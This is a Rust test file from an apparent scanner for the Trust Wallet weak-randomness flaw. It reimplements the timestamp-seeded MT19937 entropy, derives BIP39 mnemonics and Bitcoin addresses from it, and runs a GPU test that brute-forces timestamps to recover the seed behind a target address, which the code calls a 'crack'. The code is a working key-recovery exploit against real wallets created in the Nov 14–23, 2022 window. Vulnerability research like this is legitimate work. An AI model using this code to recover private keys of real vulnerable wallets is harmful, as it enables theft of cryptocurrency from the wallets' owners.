// Trust Wallet GPU Test
// Verifies Trust Wallet scanner uses same fixed MT19937/BIP39 as Milk Sad

use bip39::Mnemonic;
use bitcoin::bip32::{DerivationPath, Xpriv};
use bitcoin::secp256k1::Secp256k1;
use bitcoin::{Address, Network};
use rand_mt::Mt19937GenRand32;
use std::str::FromStr;

/// Generate entropy using MT19937 with LSB extraction (Trust Wallet actual vulnerability)
/// Trust Wallet takes LEAST significant 8 bits from each MT19937 word
fn generate_trust_wallet_entropy(timestamp: u32) -> [u8; 16] {
    let mut rng = Mt19937GenRand32::new(timestamp);
    let mut entropy = [0u8; 16];
    // LSB extraction: take only lower 8 bits from each of 16 words
    for item in entropy.iter_mut().take(16) {
        let val = rng.next_u32();
        *item = (val & 0xFF) as u8; // LSB only!
    }
    entropy
}

/// Generate address from entropy (BIP44 path m/44'/0'/0'/0/0)
fn generate_address_from_entropy(entropy: &[u8; 16]) -> String {
    let mnemonic = Mnemonic::from_entropy(entropy).expect("Valid entropy");
    let seed = mnemonic.to_seed("");

    let secp = Secp256k1::new();
    let root = Xpriv::new_master(Network::Bitcoin, &seed).expect("Valid seed");
    let path = DerivationPath::from_str("m/44'/0'/0'/0/0").expect("Valid path");
    let derived = root.derive_priv(&secp, &path).expect("Derivation");

    let private_key = bitcoin::PrivateKey::new(derived.private_key, Network::Bitcoin);
    let pubkey = private_key.public_key(&secp);
    Address::p2pkh(pubkey, Network::Bitcoin).to_string()
}

#[test]
fn test_trust_wallet_timestamp_vectors() {
    println!("\n=== Trust Wallet Timestamp Test Vectors ===\n");

    // Test within the vulnerable window (Nov 14-23, 2022)
    let test_timestamps = vec![
        1668384000u32, // Nov 14 2022 00:00:00 UTC
        1668470400u32, // Nov 15 2022 00:00:00 UTC
        1669247999u32, // Nov 23 2022 23:59:59 UTC
    ];

    for ts in test_timestamps {
        let entropy = generate_trust_wallet_entropy(ts);
        let mnemonic = Mnemonic::from_entropy(&entropy).expect("Valid");
        let address = generate_address_from_entropy(&entropy);

        println!("Timestamp: {}", ts);
        println!("  Entropy: {}", hex::encode(entropy));
        println!("  Mnemonic: {}...", &mnemonic.to_string()[..40]);
        println!("  Address: {}", address);
        println!();
    }

    println!("✓ Trust Wallet test vectors generated!");
}

#[cfg(feature = "gpu")]
#[test]
fn test_trust_wallet_gpu_crack() {
    use temporal_planetarium_lib::scans::gpu_solver::GpuSolver;

    println!("\n=== Trust Wallet GPU Crack Test ===\n");

    let solver = match GpuSolver::new() {
        Ok(s) => s,
        Err(e) => {
            println!("GPU not available, skipping: {}", e);
            return;
        }
    };

    // Generate a known address for a specific timestamp
    let test_ts = 1668470400u32; // Nov 15 2022
    let cpu_entropy = generate_trust_wallet_entropy(test_ts);
    let cpu_address = generate_address_from_entropy(&cpu_entropy);

    println!("Test timestamp: {} (Nov 15 2022)", test_ts);
    println!("CPU address: {}", cpu_address);

    // Extract hash160 for GPU with strict validation
    let addr = bitcoin::Address::from_str(&cpu_address)
        .unwrap()
        .assume_checked();
    let script = addr.script_pubkey();
    let script_bytes = script.as_bytes();

    // Verify P2PKH script structure
    assert_eq!(script_bytes.len(), 25, "P2PKH script must be 25 bytes");
    assert!(script.is_p2pkh(), "Must be P2PKH");

    let target_hash160: [u8; 20] = script_bytes[3..23].try_into().unwrap();
    println!("Target Hash160: {}", hex::encode(&target_hash160));

    // Search a small window around the known timestamp
    let start = test_ts - 5;
    let end = test_ts + 5;

    match solver.compute_trust_wallet_crack(start, end, &target_hash160) {
        Ok(results) => {
            if results.contains(&(test_ts as u64)) {
                println!("\n✓ GPU found correct timestamp: {}", test_ts);
            } else if !results.is_empty() {
                println!("Found: {:?} (expected {})", results, test_ts);
                panic!("Wrong timestamp found!");
            } else {
                println!("✗ GPU did not find timestamp");
                panic!("Trust Wallet GPU test failed");
            }
        }
        Err(e) => {
            println!("GPU error: {}", e);
            panic!("GPU crack failed");
        }
    }

    println!("\n✓ Trust Wallet GPU verification passed!");
}

#[test]
fn test_address_validation_strict() {
    use bitcoin::Address;
    use std::str::FromStr;

    println!("\n=== Address Validation Test ===\n");

    // Valid P2PKH address
    let valid_p2pkh = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"; // Genesis block address
    let addr = Address::from_str(valid_p2pkh)
        .unwrap()
        .require_network(bitcoin::Network::Bitcoin)
        .unwrap();
    let script = addr.script_pubkey();

    // Verify script length is exactly 25 bytes for P2PKH
    assert_eq!(script.len(), 25, "P2PKH script must be exactly 25 bytes");
    assert!(script.is_p2pkh(), "Must be P2PKH script");

    // Verify we can safely extract hash160 (bytes 3-23)
    let bytes = script.as_bytes();
    assert_eq!(bytes[0], 0x76, "First byte must be OP_DUP");
    assert_eq!(bytes[1], 0xa9, "Second byte must be OP_HASH160");
    assert_eq!(bytes[2], 0x14, "Third byte must be 0x14 (20 bytes)");
    assert_eq!(bytes[23], 0x88, "Byte 23 must be OP_EQUALVERIFY");
    assert_eq!(bytes[24], 0xac, "Byte 24 must be OP_CHECKSIG");

    let hash160: [u8; 20] = bytes[3..23].try_into().unwrap();
    println!("✓ Valid P2PKH validated: {}", hex::encode(hash160));

    // Test invalid addresses (should be caught before hash extraction)
    let invalid_addresses = vec![
        "bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kv8f3t4", // P2WPKH (SegWit)
        "3J98t1WpEZ73CNmYviecrnyiWrnqRhWNLy",         // P2SH
    ];

    for invalid_addr_str in invalid_addresses {
        let addr_result = Address::from_str(invalid_addr_str);
        if let Ok(addr) = addr_result {
            let checked = addr.assume_checked();
            let script = checked.script_pubkey();
            assert!(
                !script.is_p2pkh() || script.len() != 25,
                "Invalid address should not pass P2PKH validation: {}",
                invalid_addr_str
            );
            println!("✓ Correctly rejected non-P2PKH: {}", invalid_addr_str);
        }
    }

    println!("\n✓ Address validation tests passed!");
}
